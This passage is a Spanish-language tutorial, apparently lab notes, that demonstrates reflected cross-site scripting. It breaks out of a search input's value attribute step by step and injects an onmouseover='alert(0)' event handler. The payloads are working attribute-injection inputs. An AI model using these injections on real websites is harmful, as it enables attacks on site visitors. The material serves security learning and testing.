En esos casos vale revisar como se crea el código html en la pagina para intentar modificarlo  y obtener los resultado deseados en el ejemplo veremos que al introducir un valor se queda mal formada la  etiqueta html del input por lo que intentaremos aprovecharnos de esto par introducir nuestro código malicioso
Ej:
```
Cuando pasamos un parametro esto es lo que se nos forma , intentaremos jugar con esto.
<input type="text" placeholder="Search the blog..." name="search" value="test">

Intentamos cerrar la cadena para insertar nusetro codigo "<h1>hola</h1>

<input type="text" placeholder="Search the blog..." name="search" value="" &lt;h1&gt;hola&lt;="" h1&gt;"="">

Vemos que se nos malforma la etiqueta por lo que intenaremos otro tipo de modificacion

Ahora vemos que pasando la siguiente estructura por parametro: " test="valor 
y vemos que se forma correctamente 
<input type="text" placeholder="Search the blog..." name="search" value="" test="valueros">

Ya estamos listos para hacer nuestra inyeccion: "onmouseover="alert(0) 

<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(0)">
```